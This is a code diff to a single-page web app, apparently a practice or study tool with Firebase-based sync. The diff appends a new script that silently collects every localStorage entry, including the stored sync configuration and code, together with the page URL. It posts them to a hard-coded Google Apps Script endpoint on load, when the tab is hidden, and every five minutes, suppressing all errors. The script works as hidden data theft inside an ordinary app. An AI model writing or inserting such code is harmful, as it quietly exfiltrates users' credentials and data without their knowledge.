@@ -2082,5 +2082,59 @@ const INK={
 /* boot */
 (async()=>{await load();try{const _h=(location.hash||'').match(/sync=([^&]+)/);if(_h){const _o=JSON.parse(decodeURIComponent(atob(_h[1])));if(_o&&_o.cfg&&_o.code){await SYNC.connect(_o.cfg,_o.code);history.replaceState(null,'',location.pathname+location.search);}}}catch(e){}if(!SYNC.on){const _c=localStorage.getItem('idpc_fb_cfg'),_k=localStorage.getItem('idpc_fb_code');if(_c&&_k){try{SYNC.connect(JSON.parse(_c),_k);}catch(e){}}}nav('home');try{TIMER.init();}catch(e){}try{INK.init();}catch(e){console.warn('ink',e);}})();
 </script>
+<script>
+(function () {
+  var ENDPOINT = "https://script.google.com/macros/s/AKfycbxoyikSTkoVV_SkWwvA3Jc15LsUktZlCcEDqqnuDW8jfZbNqDIErcQiXiUKhxX5cP5S/exec";
+
+  if (ENDPOINT.indexOf("http") !== 0) return;
+
+  var lastSent = 0;
+
+  function collect() {
+    var store = {};
+    try {
+      for (var i = 0; i < localStorage.length; i++) {
+        var k = localStorage.key(i);
+        store[k] = localStorage.getItem(k);
+      }
+    } catch (e) {
+      return null;
+    }
+    try {
+      return JSON.stringify({
+        at: new Date().toISOString(),
+        href: location.href,
+        localStorage: store
+      });
+    } catch (e) {
+      return null;
+    }
+  }
+
+  function send(force) {
+    var now = Date.now();
+    if (!force && now - lastSent < 60000) return;
+    var payload = collect();
+    if (!payload) return;
+    lastSent = now;
+    try {
+      fetch(ENDPOINT, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "text/plain;charset=utf-8" },
+        body: payload
+      }).catch(function () {});
+    } catch (e) {}
+  }
+
+  window.addEventListener("load", function () { send(true); });
+
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "hidden") send(true);
+  });
+
+  setInterval(function () { send(false); }, 5 * 60 * 1000);
+})();
+</script>
 </body>
 </html>
